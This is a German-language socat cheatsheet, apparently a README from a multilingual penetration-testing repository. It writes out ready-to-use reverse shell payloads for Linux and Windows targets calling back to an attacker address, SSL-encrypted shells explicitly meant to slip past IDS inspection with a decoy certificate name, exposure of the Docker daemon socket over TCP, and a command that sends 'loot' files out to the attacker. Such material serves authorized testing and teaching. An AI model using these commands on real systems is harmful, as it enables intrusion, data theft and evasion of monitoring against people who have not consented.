<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="Protokolle">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Richten Sie zwei bidirektionale Byteströme ein und übertragen Sie Daten zwischen Dateien, Pipes, Geräten, Sockets und SSL-Tunneln</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Überblick und die Socat-Architektur](#-overview--the-socat-architecture)
- [Socat vs. Netcat-Vergleich](#-socat-vs-netcat-comparison)
- [Installation](#-Installation)
- [Vollständig interaktive TTY-Reverse-Shells](#-fully-interactive-tty-reverse-shells)
  - [Angreifer-Listener (RAW TTY)](#attacker-listener-raw-tty)
  - [Zielnutzlast (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [Verschlüsselte Reverse-Shells über SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [Zertifikate generieren](#generating-certificates)
  - [Verschlüsselter Listener und Verbindung](#encrypted-listener--connection)
- [Portweiterleitung und Netzwerk-Relays](#-port-forwarding--network-relays)
  - [Lokale Portweiterleitung](#local-port-forwarding)
  - [Forking Listener (Multi-Client)](#forking-listener-multi-client)
  - [UNIX-Domänen-Socket zu TCP-Relay (Docker-Weiterleitung)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [Dateiübertragungen mit Socat](#-file-transfers-with-socat)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und OPSEC](#-defensive-considerations--opsec)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Überblick und die Socat-Architektur

**Socat** (SOcket CAT) ist ein befehlszeilenbasiertes Dienstprogramm, das zwei bidirektionale Byteströme erstellt und Daten zwischen ihnen überträgt. Da die Streams aus einer Vielzahl von Adresstypen (Dateien, Pipes, Geräte, TCP/UDP-Sockets, SSL, Raw IP, SOCKS4, UNIX-Domain-Sockets) erstellt werden können, wird Socat oft als Netcat auf Steroiden bezeichnet.

Bei Penetrationstests und Red Teaming ist Socat für zwei zentrale Superkräfte bekannt:
1. **Sofortige, vollständig interaktive TTY-Reverse-Shells:** Erzeugen echter Pseudoterminals (`pty`) mit Jobsteuerung, Pfeiltasten und automatischer Vervollständigung, ohne dass Python- oder `stty raw -echo`-Gymnastik erforderlich ist.
2. **Verschlüsselte SSL/TLS-Netzwerktunnel:** Umgehung der Standard-IDS-Prüfung durch Verschlüsselung von Klartext-Nutzdaten über SSL.

---

## ⚖️ Vergleich zwischen Socat und Netcat

| Funktion | Netcat (`nc`) | Nmap `ncat` | Socat (`socat`) |
|---------|---------------|-------------|-----------------|
| **Nativer PTY-Shell-Spawn** | ❌ Nein | ❌ Nein | ✅ Native (`pty,stderr,setsid`) |
| **SSL-/TLS-Verschlüsselung** | ❌ Nein | ✅ Ja (`--ssl`) | ✅ Nativ (`OPENSSL-LISTEN`, `OPENSSL`) |
| **Forking Multi-Client Relay**| ❌ Nein | ❌ Nein | ✅ Native (`fork,reuseaddr`) |
| **UNIX-Domänen-Sockets** | ❌ Nein | ✅ Begrenzt | ✅ Native (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **Binärdateigröße** | Minimal (~40 KB) | Mäßig (~500 KB) | Mäßig (~400 KB eigenständig) |
| **Befehlssyntax** | Einfache Flags (`-lvnp`) | Flagbasiert (`-lvnp`) | Stream-Syntax (`<type>:<args>`) |

---

## 📥 Installation
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 Vollständig interaktive TTY-Reverse-Shells

Wenn Sie mit Standard-Netcat eine Reverse-Shell abfangen, erhalten Sie eine instabile dumme Shell. Socat ermöglicht ein 100 % stabiles, vollständig interaktives Pseudo-Terminal mit Tab-Vervollständigung, Strg+C-Handhabung und Bildschirmeditor-Unterstützung (`vim`, `nano`).

### Angreifer-Listener (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!NOTE]
> `file:`tty`,raw,echo=0` versetzt Ihr lokales Terminal in den Rohmodus und deaktiviert das Zeichenecho. Wenn die Verbindung unerwartet geschlossen wird und Ihr Terminal nicht reagiert, geben Sie `reset` ein und drücken Sie die Eingabetaste.

### Zielnutzlast (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### Aufschlüsselung der Optionen:
- `pty`: Weist ein Pseudo-Terminal auf dem Zielsystem zu.
- `stderr`: Leitet Standardfehler in den Socket um.
- `setsid`: Führt den Prozess in einer neuen Sitzungsgruppe aus (verhindert das Beenden, wenn das übergeordnete Element beendet wird).
- `sigint`: Übergibt Interrupt-Signale (Strg+C) an den Remote-Prozess, anstatt die Sitzung zu beenden.
- `sane`: Setzt die Terminalsteuerungseinstellungen auf die Standardeinstellungen zurück.

### Windows-Ziel-Reverse-Shell
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 Verschlüsselte Reverse Shells über SSL/TLS

Verhindern Sie, dass Network Security Monitoring (NSM), Zeek und Snort Ihre Reverse-Shell-Nutzdaten überprüfen, indem Sie den Datenverkehr mit einem kurzlebigen SSL/TLS-Zertifikat verschlüsseln.

### Generieren von Zertifikaten
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### Verschlüsselter Listener und Verbindung
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 Portweiterleitung und Netzwerk-Relays

Socat kann eingehenden Datenverkehr von einer Netzwerkschnittstelle oder einem Port direkt an ein anderes Remote-Ziel weiterleiten.

### Lokale Portweiterleitung
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### Forking-Listener (Multi-Client)

Die Option `fork` ermöglicht es Socat, für jede neue eingehende Verbindung einen untergeordneten Prozess zu erzeugen, wobei der Haupt-Listener geöffnet bleibt:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### UNIX-Domänen-Socket zu TCP-Relay (Docker-Weiterleitung)

Beim Zugriff auf einen lokalen Docker-Daemon-Socket (`/var/run/docker.sock`) ohne Root-Rechte über das Netzwerk:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 Dateiübertragungen mit Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(Das `-u`-Flag gibt den unidirektionalen Modus von der ersten zur zweiten Adresse an.*

---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Interaktiver TTY-Listener** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| **Interaktive TTY-Nutzlast** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| **Verschlüsselter SSL-Listener** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| **Verschlüsselte SSL-Nutzlast** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| **Portweiterleitung (Relay)** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| **UNIX-Socket verfügbar machen** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **Dateiübertragung (Empfänger)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **Dateiübertragung (Absender)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ Defensive Überlegungen und OPSEC

1. **Verkehrsverschlüsselung:** Klartext-TCP-Reverse-Shells stellen Befehle für IDS/IPS bereit. Verwenden Sie bei Einsätzen des roten Teams immer `OPENSSL-LISTEN` und `OPENSSL`.
2. **Prozessüberwachung:** Sysmon-/EDR-Plattformen kennzeichnen Befehle, die `pty,stderr,setsid` aufrufen, als sofortige Reverse-Shell-Heuristik.
3. **Eigenständige Binärdateien:** Verwenden Sie bei der Bereitstellung auf Zielsystemen statisch kompilierte eigenständige Socat-Binärdateien, um Abhängigkeiten von gemeinsam genutzten Bibliotheken zu vermeiden.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Dieses Cheatsheet ist nur für autorisierte Penetrationstests, Sicherheitsbewertungen und akademische Forschung bestimmt. Unbefugter Zugriff auf Computersysteme und Netzwerkmanipulationen sind strengstens illegal.